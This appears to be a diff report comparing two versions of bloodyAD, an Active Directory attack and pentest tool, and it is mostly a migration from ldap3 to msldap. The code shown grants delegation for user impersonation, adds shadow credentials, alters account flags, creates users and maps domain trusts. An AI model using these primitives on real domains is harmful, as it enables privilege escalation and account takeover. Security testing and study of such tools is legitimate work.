     Add Resource Based Constraint Delegation for service on target, used to impersonate a user on target with service (Requires "Write" permission on target's msDS-AllowedToActOnBehalfOfOtherIdentity and Windows Server >= 2012)
 
@@ -250,26 +255,28 @@
     control_flag = 0
     new_sd, _ = utils.getSD(
         conn, target, "msDS-AllowedToActOnBehalfOfOtherIdentity", control_flag
     )
     if "s-1-" in service.lower():
         service_sid = service
     else:
-        service_sid = next(conn.ldap.bloodysearch(service, attr="objectSid"))[
+        service_sid = next(conn.ldap.bloodysearch(service, attr=["objectSid"]))[
             "objectSid"
         ]
     access_mask = accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
     utils.addRight(new_sd, service_sid, access_mask)
 
     conn.ldap.bloodymodify(
         target,
         {
             "msDS-AllowedToActOnBehalfOfOtherIdentity": [
-                ldap3.MODIFY_REPLACE,
-                new_sd.getData(),
+                (
+                    Change.REPLACE.value,
+                    new_sd.getData(),
+                )
             ]
         },
     )
 
     LOG.info(f"[+] {service} can now impersonate users on {target} via S4U2Proxy")
 
 
@@ -314,15 +321,15 @@
 
     LOG.debug("[*] Updating the msDS-KeyCredentialLink attribute of %s" % target)
 
     key_dnbinary = common.DNBinary()
     key_dnbinary.fromCanonical(keyCredential.getData(), target_dn)
     conn.ldap.bloodymodify(
         target_dn,
-        {"msDS-KeyCredentialLink": [ldap3.MODIFY_ADD, str(key_dnbinary)]},
+        {"msDS-KeyCredentialLink": [(Change.ADD.value, str(key_dnbinary))]},
     )
 
     LOG.debug("[+] msDS-KeyCredentialLink attribute of the target object updated")
     if not path:
         path = "".join(
             random.choice(string.ascii_letters + string.digits) for i in range(8)
         )
@@ -378,28 +385,30 @@
 
     uac = 0
     for flag in f:
         uac |= accesscontrol.ACCOUNT_FLAGS[flag]
 
     try:
         old_uac = next(
-            conn.ldap.bloodysearch(target, attr="userAccountControl", raw=True)
+            conn.ldap.bloodysearch(target, attr=["userAccountControl"], raw=True)
         )["userAccountControl"][0]
     except IndexError as e:
-        for allowed in next(conn.ldap.bloodysearch(target, attr="allowedAttributes"))[
+        for allowed in next(conn.ldap.bloodysearch(target, attr=["allowedAttributes"]))[
             "allowedAttributes"
         ]:
             if "userAccountControl" in allowed:
                 raise BloodyError(
                     "Current user doesn't have the right to read userAccountControl on"
                     f" {target}"
                 ) from e
         raise BloodyError(f"{target} doesn't have userAccountControl attribute") from e
     uac |= int(old_uac)
-    conn.ldap.bloodymodify(target, {"userAccountControl": [ldap3.MODIFY_REPLACE, uac]})
+    conn.ldap.bloodymodify(
+        target, {"userAccountControl": [(Change.REPLACE.value, uac)]}
+    )
 
     LOG.info(f"[-] {f} property flags added to {target}'s userAccountControl")
 
 
 def user(conn, sAMAccountName: str, newpass: str, ou: str = "DefaultOU"):
     """
     Add a new user
@@ -407,15 +416,15 @@
     :param sAMAccountName: sAMAccountName for new user
     :param newpass: password for new user
     :param ou: Organizational Unit for new user
     """
     if ou == "DefaultOU":
         container = None
         for obj in next(
-            conn.ldap.bloodysearch(conn.ldap.domainNC, attr="wellKnownObjects")
+            conn.ldap.bloodysearch(conn.ldap.domainNC, attr=["wellKnownObjects"])
         )["wellKnownObjects"]:
             if "GUID_USERS_CONTAINER_W" == obj.binary_value:
                 container = obj.dn
                 break
         if not container:
             LOG.warning(
                 "Default container for users not found, defaulting to CN=Users,"
@@ -427,12 +436,12 @@
         user_dn = f"cn={sAMAccountName},{ou}"
 
     attr = {
         "objectClass": ["top", "person", "organizationalPerson", "user"],
         "distinguishedName": user_dn,
         "sAMAccountName": sAMAccountName,
         "userAccountControl": 544,
-        "unicodePwd": ('"%s"' % newpass).encode("utf-16-le"),
+        "unicodePwd": '"%s"' % newpass,
     }
 
     conn.ldap.bloodyadd(user_dn, attributes=attr)
     LOG.info(f"[+] {sAMAccountName} created")
```

### Comparing `bloodyad-1.1.1/bloodyAD/cli_modules/get.py` & `bloodyad-2.0.3/bloodyAD/cli_modules/get.py`

 * *Files 21% similar despite different names*

```diff
@@ -1,34 +1,38 @@
-from bloodyAD import utils
+from bloodyAD import utils, asciitree
 from bloodyAD.utils import LOG
+from bloodyAD.network.ldap import Scope
+from bloodyAD.exceptions import NoResultError
+from bloodyAD.formatters import common
+from msldap.commons.exceptions import LDAPSearchException
+from dns import resolver
 from typing import Literal
 import re
-import ldap3
-from ldap3.core.exceptions import LDAPNoSuchObjectResult
 
 
 def children(conn, target: str = "DOMAIN", otype: str = "*", direct: bool = False):
     """
     List children for a given target object
 
     :param target: sAMAccountName, DN, GUID or SID of the target
-    :param otype: special keyword "useronly" or objectClass of objects to fetch e.g. user, computer, group, organizationalUnit, container, groupPolicyContainer, msDS-GroupManagedServiceAccount, etc
+    :param otype: special keyword "useronly" or objectClass of objects to fetch e.g. user, computer, group, trustedDomain, organizationalUnit, container, groupPolicyContainer, msDS-GroupManagedServiceAccount, etc
     :param direct: Fetch only direct children of target
     """
-    target = conn.ldap.domainNC
-    scope = ldap3.LEVEL if direct else ldap3.SUBTREE
+    if target == "DOMAIN":
+        target = conn.ldap.domainNC
+    scope = Scope.LEVEL if direct else Scope.SUBTREE
     if otype == "useronly":
-        otype_filter = f"sAMAccountType=805306368"
+        otype_filter = "sAMAccountType=805306368"
     else:
         otype_filter = f"objectClass={otype}"
     return conn.ldap.bloodysearch(
         target,
         f"(&({otype_filter})(!(distinguishedName={target})))",
         search_scope=scope,
-        attr="",
+        attr=["distinguishedName"],
     )
 
 
 # TODO: Fetch records from Global Catalog and also other partitions stored on other DC if possible
 def dnsDump(conn, zone: str = None, no_detail: bool = False):
     """
     Retrieve DNS records of the Active Directory readable/listable by the user
@@ -58,20 +62,21 @@
 
     dnsZones = []
     for nc in conn.ldap.appNCs + [conn.ldap.domainNC]:
         try:
             entries = conn.ldap.bloodysearch(
                 nc,
                 filter,
-                search_scope=ldap3.SUBTREE,
+                search_scope=Scope.SUBTREE,
                 attr=["dnsRecord", "name", "objectClass"],
             )
-        except LDAPNoSuchObjectResult:
+        except (NoResultError, LDAPSearchException):
             continue
 
+        domain_set = set()
         for entry in entries:
             domain_suffix = entry["distinguishedName"].split(",")[1]
             domain_suffix = domain_suffix.split("=")[1]
 
             # RootDNSServers and ..TrustAnchors are system records not interesting for offensive normally
             if domain_suffix == "RootDNSServers" or domain_suffix == "..TrustAnchors":
                 continue
@@ -85,24 +90,33 @@
                 dnsZones.append(entry["distinguishedName"])
                 continue
 
             domain_name = entry["name"]
 
             if domain_name == "@":  # @ is for dnsZone info
                 domain_name = domain_suffix
-            else:  # even for reverse lookup (X.X.X.X.in-addr.arpa), domain suffix should be parent name?
-                domain_name = domain_name + "." + domain_suffix
+            else:  # even for reverse lookup (X.X.X.X.in-addr.arpa), domain suffix should be the parent name?
+                if (
+                    domain_name[-1] != "."
+                ):  # Then it's probably not a fqdn, suffix needed
+                    domain_name = domain_name + "." + domain_suffix
 
             ip_addr = domain_name.split(".in-addr.arpa")
             if len(ip_addr) > 1:
                 decimals = ip_addr[0].split(".")
                 decimals.reverse()
+                while len(decimals) < 4:
+                    decimals.append("0")
                 domain_name = ".".join(decimals)
 
+            # Sometimes domain is in multiple dnsZones
+            if domain_name in domain_set:
+                continue
             yield_entry = {"recordName": domain_name}
+            domain_set.add(domain_name)
             for record in entry["dnsRecord"]:
                 try:
                     if record["Type"] not in yield_entry:
                         yield_entry[record["Type"]] = []
                     if record["Type"] in ["A", "AAAA", "NS", "CNAME", "PTR", "TXT"]:
                         yield_entry[record["Type"]].append(record["Data"])
                     elif record["Type"] == "MX":
@@ -127,89 +141,220 @@
     for nc in conn.ldap.appNCs:
         dnsZones.append(f"CN=MicrosoftDNS,{nc}")
     dnsZones.append(f"CN=MicrosoftDNS,CN=System,{conn.ldap.domainNC}")
     for searchbase in dnsZones:
         try:
             entries = conn.ldap.bloodysearch(
                 searchbase,
-                f"(objectClass=*)",
-                search_scope=ldap3.SUBTREE,
-                attr="objectClass",
+                "(objectClass=*)",
+                search_scope=Scope.SUBTREE,
+                attr=["objectClass"],
             )
-        except LDAPNoSuchObjectResult:
+        except (NoResultError, LDAPSearchException):
             continue
         for entry in entries:
-            if entry["objectClass"] or entry["distinguishedName"] == searchbase:
+            if entry.get("objectClass") or entry["distinguishedName"] == searchbase:
                 continue
 
             domain_parts = entry["distinguishedName"].split(",")
             domain_suffix = domain_parts[1].split("=")[1]
 
-            domain_prefix = domain_parts[0].split("=")[1]
-            if no_detail and re.match("|".join(prefix_blacklist), domain_prefix):
+            domain_name = domain_parts[0].split("=")[1]
+            if no_detail and re.match("|".join(prefix_blacklist), domain_name):
                 continue
 
-            domain_name = f"{domain_prefix}.{domain_suffix}"
+            if (
+                domain_name[-1] != "."
+            ):  # Then it's probably not a fqdn, suffix certainly needed
+                domain_name = f"{domain_name}.{domain_suffix}"
 
             ip_addr = domain_name.split(".in-addr.arpa")
             if len(ip_addr) > 1:
                 decimals = ip_addr[0].split(".")
                 decimals.reverse()
+                while len(decimals) < 4:
+                    decimals.append("0")
                 domain_name = ".".join(decimals)
-
-            yield {"recordName": domain_name, "type": "ACCESS DENIED"}
+            # If domain has already been retrieved when searching with dnsNode filter (beacuse we had read_prop on it)
+            # Or domain is in multiple dnsZones
+            if domain_name in domain_set:
+                continue
+            domain_set.add(domain_name)
+            yield {"recordName": domain_name}
 
 
 def membership(conn, target: str, no_recurse: bool = False):
     """
     Retrieve SID and SAM Account Names of all groups a target belongs to
 
     :param target: sAMAccountName, DN, GUID or SID of the target
     :param no_recurse: if set, doesn't retrieve groups where target isn't a direct member
     """
     ldap_filter = ""
     if no_recurse:
         entries = conn.ldap.bloodysearch(target, attr=["objectSid", "memberOf"])
         for entry in entries:
-            for group in entry["memberOf"]:
+            for group in entry.get("memberOf", []):
                 ldap_filter += f"(distinguishedName={group})"
         if not ldap_filter:
             LOG.warning("[!] No direct group membership found")
             return []
     else:
         # [MS-ADTS] 3.1.1.4.5.19 tokenGroups, tokenGroupsNoGCAcceptable
         attr = "tokenGroups"
         entries = conn.ldap.bloodysearch(target, attr=[attr])
         for entry in entries:
-            for groupSID in entry[attr]:
-                ldap_filter += f"(objectSID={groupSID})"
+            try:
+                for groupSID in entry[attr]:
+                    ldap_filter += f"(objectSID={groupSID})"
+            except KeyError:
+                LOG.warning("[!] No membership found")
+                return []
         if not ldap_filter:
             LOG.warning("no GC Server available, the set of groups might be incomplete")
             attr = "tokenGroupsNoGCAcceptable"
             entries = conn.ldap.bloodysearch(target, attr=[attr])
             for entry in entries:
                 for groupSID in entry[attr]:
                     ldap_filter += f"(objectSID={groupSID})"
 
     entries = conn.ldap.bloodysearch(
         conn.ldap.domainNC,
         f"(|{ldap_filter})",
-        search_scope=ldap3.SUBTREE,
+        search_scope=Scope.SUBTREE,
         attr=["objectSID", "sAMAccountName"],
     )
     return entries
 
 
+def trusts(conn, transitive_trust: bool = False, dns: str = ""):
+    """
+    Display trusts in an ascii tree starting from the DC domain as tree root. A->B means A can auth on B and A-<B means B can auth on A, A-<>B means bidirectionnal
+
+    :param transitive_trust: Try to fetch transitive trusts (you should start from a dc of your user domain to have more complete results)
+    :param dns: custom DNS IP (useful if current DC is not a GC and system DNS and DC DNS can't resolve trusts domains)
+    """
+    # Get all forest partitions of domain type
+    # partitions = conn.ldap.bloodysearch("CN=Partitions," + conn.ldap.configNC, "(&(objecClass=crossRef)(systemFlags=3))", attr=["nCName"])
+
+    # Get the host domain as root for the trust tree
+    trust_root_domain = (".".join(conn.ldap.domainNC.split(",DC="))).split("DC=")[1]
+
+    def fetchTrusts(conn, domain_name, trust_dict, dns):
+        if domain_name:
+            try:
+                gc = utils.findReachableServer(conn, domain_name, "gc", dns)
+            except resolver.NoAnswer:
+                gc = None
+            if not gc:
+                LOG.warning(
+                    f"[!] No Global Catalog found for {domain_name}, try to provide one"
+                    " manually in --host"
+                )
+                return {}
+
+        else:
+            gc = conn.conf.host
+
+        # Switch connection to a GC but on LDAP port to increase firewall bypass chances
+        # Anyway we can access all partitions hosted by the DC on LDAP port too
+        # We try to find a GC because we're sure it has all forest partitions but:
+        # TODO: we could check by who has the NC replicas we need until we collect all the replicas
+        conn.conf.scheme = "ldap"
+        conn.conf.host = gc
+        conn.rebind()
+
+        # Tree root is the DC domain
+        trust_to_explore = set()
+        trusts = conn.ldap.bloodysearch(
+            "",
+            "(objectClass=trustedDomain)",
+            attr=["trustDirection", "trustPartner", "trustAttributes", "trustType"],
+            search_scope=Scope.SUBTREE,
+            raw=True,
+            controls=[utils.phantomRoot()],
+        )
+        for trust in trusts:
+            already_in_tree = (
+                ((trust["distinguishedName"]).rsplit("CN=System,", 1)[1]).replace(
+                    "DC=", ""
+                )
+            ).replace(",", ".")
+            if already_in_tree not in trust_dict:
+                trust_dict[already_in_tree] = {}
+            trust_dict[already_in_tree][trust["trustPartner"][0].decode()] = trust
+
+            # We already have access to all the partitions of the forest through the GC we don't need to connect to other forest DCs
+            if (
+                common.TRUST_ATTRIBUTES["WITHIN_FOREST"]
+                & int(trust["trustAttributes"][0].decode())
+                > 0
+            ):
+                continue
+            # We assume user belong to forest of provided DC in --host so we can explore external trusts only if we can auth on it (inbound)
+            if (
+                common.TRUST_DIRECTION["INBOUND"]
+                & int(trust["trustDirection"][0].decode())
+                > 0
+            ):
+                trust_to_explore.add(trust["trustPartner"][0].decode())
+
+        return trust_to_explore
+
+    forest_name = ""
+    # Find a GC
+    # Check if current DC is a GC
+    NTDSDSA_OPT_IS_GC = 1
+    nTDSDSA_options = next(
+        conn.ldap.bloodysearch(conn.ldap._serverinfo["dsServiceName"], attr=["options"])
+    )["options"]
+    if nTDSDSA_options & NTDSDSA_OPT_IS_GC == 0:
+        LOG.debug("[*] Current DC is not a GC, let's find one")
+        forest_name = (
+            ".".join(conn.ldap._serverinfo["rootDomainNamingContext"].split(",DC="))
+        ).split("DC=")[1]
+
+    trust_dict = {}
+    trust_to_explore = fetchTrusts(conn, forest_name, trust_dict, dns)
+
+    # We don't do it on foreign trust because there is no transitivity between 3 forests (A<->B<->C) A doesn't have trust on C even if B has it
+    if transitive_trust:
+        if not conn.conf.domain:
+            LOG.warning(
+                "[!] No domain (-d, --domain) provided, transitive trust will not be"
+                " performed"
+            )
+        elif conn.conf.domain not in trust_dict:
+            LOG.warning(
+                "[!] User doesn't belong to this forest, transitive trusts will not be"
+                " performed"
+            )
+        else:
+            LOG.info(
+                "[+] Forest trusts fetched, performing transitive trusts resolution"
+            )
+            for domain_name in trust_to_explore:
+                fetchTrusts(conn, domain_name, trust_dict, dns)
+
+    if not trust_dict:
+        LOG.warning("[!] No Trusts found")
+    else:
+        tree = {}
+        asciitree.branchFactory({":" + trust_root_domain: tree}, [], trust_dict)
+        tree_printer = asciitree.LeftAligned()
+        print(tree_printer({trust_root_domain: tree}))
+
+
 def object(
     conn, target: str, attr: str = "*", resolve_sd: bool = False, raw: bool = False
 ):
     """
     Retrieve LDAP attributes for the target object provided, binary data will be outputted in base64
 
-    :param target: sAMAccountName, DN, GUID or SID of the target
+    :param target: sAMAccountName, DN, GUID or SID of the target (if you give an empty string "" prints rootDSE)
     :param attr: attributes to retrieve separated by a comma, retrieves all the attributes by default
     :param resolve_sd: if set, permissions linked to a security descriptor will be resolved (see bloodyAD github wiki/Access-Control for more information)
     :param raw: if set, will return attributes as sent by the server without any formatting, binary data will be outputted in base64
     """
     attributesSD = [
         "nTSecurityDescriptor",
         "msDS-GroupMSAMembership",
@@ -217,15 +362,19 @@
     ]
     entries = conn.ldap.bloodysearch(target, attr=attr.split(","), raw=raw)
     rendered_entries = utils.renderSearchResult(entries)
     if resolve_sd and not raw:
         for entry in rendered_entries:
             for attrSD in attributesSD:
                 if attrSD in entry:
-                    entry[attrSD] = utils.renderSD(entry[attrSD], conn)
+                    e = entry[attrSD]
+                    if not isinstance(e, list):
+                        entry[attrSD] = utils.renderSD(e, conn)
+                    else:
+                        entry[attrSD] = [utils.renderSD(sd, conn) for sd in e]
             yield entry
     else:
         yield from rendered_entries
 
 
 def search(
     conn,
@@ -248,27 +397,26 @@
         "nTSecurityDescriptor",
         "msDS-GroupMSAMembership",
         "msDS-AllowedToActOnBehalfOfOtherIdentity",
     ]
     if base == "DOMAIN":
         base = conn.ldap.domainNC
     entries = conn.ldap.bloodysearch(
-        base,
-        filter,
-        search_scope=ldap3.SUBTREE,
-        attr=attr.split(","),
-        raw=raw,
-        generator=True,
+        base, filter, search_scope=Scope.SUBTREE, attr=attr.split(","), raw=raw
     )
     rendered_entries = utils.renderSearchResult(entries)
     if resolve_sd and not raw:
         for entry in rendered_entries:
             for attrSD in attributesSD:
                 if attrSD in entry:
-                    entry[attrSD] = utils.renderSD(entry[attrSD], conn)
+                    e = entry[attrSD]
+                    if not isinstance(e, list):
+                        entry[attrSD] = utils.renderSD(e, conn)
+                    else:
+                        entry[attrSD] = [utils.renderSD(sd, conn) for sd in e]
             yield entry
     else:
         yield from rendered_entries
 
 
 # TODO: Search writable for application partitions too?
 def writable(
@@ -281,15 +429,15 @@
     """
     Retrieve objects writable by client
 
     :param otype: type of writable object to retrieve
     :param right: type of right to search
     :param detail: if set, displays attributes/object types you can write/create for the object
     """
-    #:param partition: directory partition a.k.a naming context to explore
+    # :param partition: directory partition a.k.a naming context to explore
 
     ldap_filter = ""
     if otype == "USER":
         ldap_filter = "(sAMAccountType=805306368)"
     else:
         if otype == "ALL":
             objectClass = "*"
@@ -338,19 +486,15 @@
     # elif partition == "DNS":
     #     searchbases.append(conn.ldap.applicationNCs) # A definir https://learn.microsoft.com/en-us/windows/win32/ad/enumerating-application-directory-partitions-in-a-forest
     # else:
     #     searchbases.append(conn.ldap.NCs) # A definir
     right_entry = {}
     for searchbase in searchbases:
         for entry in conn.ldap.bloodysearch(
-            searchbase,
-            ldap_filter,
-            search_scope=ldap3.SUBTREE,
-            attr=attr_params.keys(),
-            generator=True,
+            searchbase, ldap_filter, search_scope=Scope.SUBTREE, attr=attr_params.keys()
         ):
             for attr_name in entry:
                 if attr_name not in attr_params:
                     continue
                 key_names = attr_params[attr_name]["lambda"](entry[attr_name])
                 for name in key_names:
                     if name == "distinguishedName":
```

### Comparing `bloodyad-1.1.1/bloodyAD/cli_modules/remove.py` & `bloodyad-2.0.3/bloodyAD/cli_modules/remove.py`

 * *Files 5% similar despite different names*

```diff
@@ -1,38 +1,41 @@
 import binascii
 from typing import Literal
+import msldap
 from bloodyAD import utils
 from bloodyAD.utils import LOG
 from bloodyAD.formatters import accesscontrol, common, dns, cryptography
 from bloodyAD.exceptions import BloodyError
-import ldap3
+from bloodyAD.network.ldap import Change
 
 
 def dcsync(conn, trustee: str):
     """
     Remove DCSync right for provided trustee
 
     :param trustee: sAMAccountName, DN, GUID or SID of the trustee
     """
     new_sd, _ = utils.getSD(conn, conn.ldap.domainNC)
     if "s-1-" in trustee.lower():
         trustee_sid = trustee
     else:
-        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr="objectSid"))[
+        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr=["objectSid"]))[
             "objectSid"
         ]
     access_mask = accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
     utils.delRight(new_sd, trustee_sid, access_mask)
 
-    controls = ldap3.protocol.microsoft.security_descriptor_control(
-        sdflags=accesscontrol.DACL_SECURITY_INFORMATION
-    )
+    req_flags = msldap.wintypes.asn1.sdflagsrequest.SDFlagsRequestValue({
+        "Flags": accesscontrol.DACL_SECURITY_INFORMATION
+    })
+    controls = [("1.2.840.113556.1.4.801", True, req_flags.dump())]
+
     conn.ldap.bloodymodify(
         conn.ldap.domainNC,
-        {"nTSecurityDescriptor": [ldap3.MODIFY_REPLACE, new_sd.getData()]},
+        {"nTSecurityDescriptor": [(Change.REPLACE.value, new_sd.getData())]},
         controls,
     )
 
     LOG.info(f"[-] {trustee} can't DCSync anymore")
 
 
 def dnsRecord(
@@ -81,20 +84,19 @@
     else:
         zone_type = "DomainDnsZones"
 
     zone_dn = f",DC={zone},CN=MicrosoftDNS,DC={zone_type}{naming_context}"
     record_dn = f"DC={name}{zone_dn}"
 
     record_to_remove = None
-    dns_list = next(conn.ldap.bloodysearch(record_dn, attr="dnsRecord", raw=True))[
+    dns_list = next(conn.ldap.bloodysearch(record_dn, attr=["dnsRecord"], raw=True))[
         "dnsRecord"
     ]
     for raw_record in dns_list:
         record = dns.Record(raw_record)
-        print(record.toDict())
         tmp_record = dns.Record()
 
         if not ttl:
             ttl = record["TtlSeconds"]
         tmp_record.fromDict(
             data,
             dnstype,
@@ -112,15 +114,15 @@
 
     if not record_to_remove:
         LOG.warning("[!] Record not found")
         return
 
     if len(dns_list) > 1:
         conn.ldap.bloodymodify(
-            record_dn, {"dnsRecord": (ldap3.MODIFY_DELETE, record_to_remove)}
+            record_dn, {"dnsRecord": [(Change.DELETE.value, record_to_remove)]}
         )
     else:
         conn.ldap.bloodydelete(record_dn)
 
     LOG.info(f"[-] Given record has been successfully removed from {name}")
 
 
@@ -131,25 +133,27 @@
     :param target: sAMAccountName, DN, GUID or SID of the target
     :param trustee: sAMAccountName, DN, GUID or SID of the trustee
     """
     new_sd, _ = utils.getSD(conn, target)
     if "s-1-" in trustee.lower():
         trustee_sid = trustee
     else:
-        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr="objectSid"))[
+        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr=["objectSid"]))[
             "objectSid"
         ]
     utils.delRight(new_sd, trustee_sid)
 
-    controls = ldap3.protocol.microsoft.security_descriptor_control(
-        sdflags=accesscontrol.DACL_SECURITY_INFORMATION
-    )
+    req_flags = msldap.wintypes.asn1.sdflagsrequest.SDFlagsRequestValue({
+        "Flags": accesscontrol.DACL_SECURITY_INFORMATION
+    })
+    controls = [("1.2.840.113556.1.4.801", True, req_flags.dump())]
+
     conn.ldap.bloodymodify(
         target,
-        {"nTSecurityDescriptor": [ldap3.MODIFY_REPLACE, new_sd.getData()]},
+        {"nTSecurityDescriptor": [(Change.REPLACE.value, new_sd.getData())]},
         controls,
     )
 
     LOG.info(f"[-] {trustee} doesn't have GenericAll on {target} anymore")
 
 
 def groupMember(conn, group: str, member: str):
@@ -165,15 +169,17 @@
     # see [MS-ADTS] - 3.1.1.5.3.3 Processing Specifics
     if "s-1-" in member.lower():
         # We assume member is an SID
         member_transformed = f"<SID={member}>"
     else:
         member_transformed = conn.ldap.dnResolver(member)
 
-    conn.ldap.bloodymodify(group, {"member": (ldap3.MODIFY_DELETE, member_transformed)})
+    conn.ldap.bloodymodify(
+        group, {"member": [(Change.DELETE.value, member_transformed)]}
+    )
     LOG.info(f"[-] {member} removed from {group}")
 
 
 def object(conn, target: str):
     """
     Remove object (user, group, computer, organizational unit, etc)
 
@@ -193,29 +199,31 @@
     control_flag = 0
     new_sd, _ = utils.getSD(
         conn, target, "msDS-AllowedToActOnBehalfOfOtherIdentity", control_flag
     )
     if "s-1-" in service.lower():
         service_sid = service
     else:
-        service_sid = next(conn.ldap.bloodysearch(service, attr="objectSid"))[
+        service_sid = next(conn.ldap.bloodysearch(service, attr=["objectSid"]))[
             "objectSid"
         ]
     access_mask = accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
     utils.delRight(new_sd, service_sid, access_mask)
 
     attr_values = []
     if len(new_sd["Dacl"].aces) > 0:
-        attr_values.append(new_sd.getData())
+        attr_values = new_sd.getData()
     conn.ldap.bloodymodify(
         target,
         {
             "msDS-AllowedToActOnBehalfOfOtherIdentity": [
-                ldap3.MODIFY_REPLACE,
-                attr_values,
+                (
+                    Change.REPLACE.value,
+                    attr_values,
+                )
             ]
         },
     )
 
     LOG.info(f"[-] {service} can't impersonate users on {target} anymore")
 
 
@@ -223,32 +231,31 @@
     """
     Remove Key Credentials from target
 
     :param target: sAMAccountName, DN, GUID or SID of the target
     :param key: RSA key of Key Credentials to remove from the target, removes all if key not specified
     """
     keyCreds = next(
-        conn.ldap.bloodysearch(target, attr="msDS-KeyCredentialLink", raw=True)
+        conn.ldap.bloodysearch(target, attr=["msDS-KeyCredentialLink"], raw=True)
     )["msDS-KeyCredentialLink"]
     newKeyCreds = []
     isFound = False
     for keyCred in keyCreds:
         key_raw = common.DNBinary(keyCred).value
         key_blob = cryptography.KEYCREDENTIALLINK_BLOB(key_raw)
         if key and key_blob.getKeyID() != binascii.unhexlify(key):
-            newKeyCreds.append(keyCred)
+            newKeyCreds.append(keyCred.decode())
         else:
             isFound = True
             LOG.debug("[*] Key to delete found")
 
     if not isFound:
         LOG.warning("[!] No key found")
-
     conn.ldap.bloodymodify(
-        target, {"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, newKeyCreds]}
+        target, {"msDS-KeyCredentialLink": [(Change.REPLACE.value, newKeyCreds)]}
     )
 
     str_key = key if key else "All keys"
     LOG.info(f"[-] {str_key} removed")
 
 
 def uac(conn, target: str, f: list = None):
@@ -260,24 +267,26 @@
     """
     uac = 0
     for flag in f:
         uac |= accesscontrol.ACCOUNT_FLAGS[flag]
 
     try:
         old_uac = next(
-            conn.ldap.bloodysearch(target, attr="userAccountControl", raw=True)
+            conn.ldap.bloodysearch(target, attr=["userAccountControl"], raw=True)
         )["userAccountControl"][0]
     except IndexError as e:
-        for allowed in next(conn.ldap.bloodysearch(target, attr="allowedAttributes"))[
+        for allowed in next(conn.ldap.bloodysearch(target, attr=["allowedAttributes"]))[
             "allowedAttributes"
         ]:
             if "userAccountControl" in allowed:
                 raise BloodyError(
                     "Current user doesn't have the right to read userAccountControl on"
                     f" {target}"
                 ) from e
         raise BloodyError(f"{target} doesn't have userAccountControl attribute") from e
 
     uac = int(old_uac) & ~uac
-    conn.ldap.bloodymodify(target, {"userAccountControl": [ldap3.MODIFY_REPLACE, uac]})
+    conn.ldap.bloodymodify(
+        target, {"userAccountControl": [(Change.REPLACE.value, uac)]}
+    )
 
     LOG.info(f"[-] {f} property flags removed from {target}'s userAccountControl")
```

### Comparing `bloodyad-1.1.1/bloodyAD/formatters/accesscontrol.py` & `bloodyad-2.0.3/bloodyAD/formatters/accesscontrol.py`

 * *Files 21% similar despite different names*

```diff
@@ -1,10 +1,9 @@
-from bloodyAD.formatters import ldaptypes, helpers
+from bloodyAD.formatters import ldaptypes
 import uuid
-from functools import lru_cache
 
 
 # 2.4.7 SECURITY_INFORMATION
 OWNER_SECURITY_INFORMATION = 0x00000001
 GROUP_SECURITY_INFORMATION = 0x00000002
 DACL_SECURITY_INFORMATION = 0x00000004
 SACL_SECURITY_INFORMATION = 0x00000008
@@ -80,59 +79,14 @@
     "PASSWORD_EXPIRED": 0x800000,
     "TRUSTED_TO_AUTH_FOR_DELEGATION": 0x1000000,
     "PARTIAL_SECRETS_ACCOUNT": 0x04000000,
     "USE_AES_KEYS": 0x8000000,
 }
 
 
-@lru_cache
-def decodeAccessMask(mask):
-    tmp_mask = [(key, val) for key, val in ACCESS_FLAGS.items() if mask.hasPriv(val)]
-    pretty_mask = []
-    for i in range(0, len(tmp_mask)):
-        isDuplicate = False
-        for j in range(i + 1, len(tmp_mask)):
-            if tmp_mask[j][1] & tmp_mask[i][1] == tmp_mask[i][1]:
-                isDuplicate = True
-        for mask in pretty_mask:
-            if mask[1] & tmp_mask[i][1] == tmp_mask[i][1]:
-                isDuplicate = True
-        if not isDuplicate:
-            pretty_mask.append(tmp_mask[i])
-    pretty_mask = [key for key, val in pretty_mask]
-    return pretty_mask if len(pretty_mask) > 0 else mask["Mask"]
-
-
-def decodeAceFlags(ace):
-    pretty_flags = [key for key, val in ACE_FLAGS.items() if ace.hasFlag(val)]
-    return pretty_flags if len(pretty_flags) > 0 else ace["AceFlags"]
-
-
-def decodeAce(ace):
-    ace_val = ace["Ace"]
-    pretty_ace = {
-        "TypeName": ace["TypeName"],
-        "Trustee": helpers.resolveSid(ace_val["Sid"].formatCanonical()),
-        "Mask": decodeAccessMask(ace_val["Mask"]),
-    }
-    if ace["AceFlags"] > 0:
-        pretty_ace["Flags"] = decodeAceFlags(ace)
-    if (
-        "InheritedObjectType" in ace_val.__dict__["fields"]
-        and len(ace_val["InheritedObjectType"]) != 0
-    ):
-        pretty_ace["InheritedObjectType"] = helpers.resolveGUID(
-            ace_val["InheritedObjectType"]
-        )
-    if "ObjectType" in ace_val.__dict__["fields"] and len(ace_val["ObjectType"]) != 0:
-        pretty_ace["ObjectType"] = helpers.resolveGUID(ace_val["ObjectType"])
-
-    return pretty_ace
-
-
 def createACE(sid, object_type=None, access_mask=ACCESS_FLAGS["FULL_CONTROL"]):
     nace = ldaptypes.ACE()
     nace["AceFlags"] = (
         ACE_FLAGS["CONTAINER_INHERIT_ACE"] + ACE_FLAGS["OBJECT_INHERIT_ACE"]
     )
 
     if object_type is None:
```

### Comparing `bloodyad-1.1.1/bloodyAD/formatters/adschema.py` & `bloodyad-2.0.3/bloodyAD/formatters/adschema.py`

 * *Files identical despite different names*

### Comparing `bloodyad-1.1.1/bloodyAD/formatters/common.py` & `bloodyad-2.0.3/bloodyAD/formatters/common.py`

 * *Files 16% similar despite different names*

```diff
@@ -64,7 +64,28 @@
     "F4BE92A4C777485E878E9421D53087DB": "GUID_MICROSOFT_PROGRAM_DATA_CONTAINER_W",
     "6227F0AF1FC2410D8E3BB10615BB5B0F": "GUID_NTDS_QUOTAS_CONTAINER_W",
     "09460C08AE1E4A4EA0F64AEE7DAA1E5A": "GUID_PROGRAM_DATA_CONTAINER_W",
     "AB1D30F3768811D1ADED00C04FD8D5CD": "GUID_SYSTEMS_CONTAINER_W",
     "A9D1CA15768811D1ADED00C04FD8D5CD": "GUID_USERS_CONTAINER_W",
     "1EB93889E40C45DF9F0C64D23BBB6237": "GUID_MANAGED_SERVICE_ACCOUNTS_CONTAINER_W",
 }
+
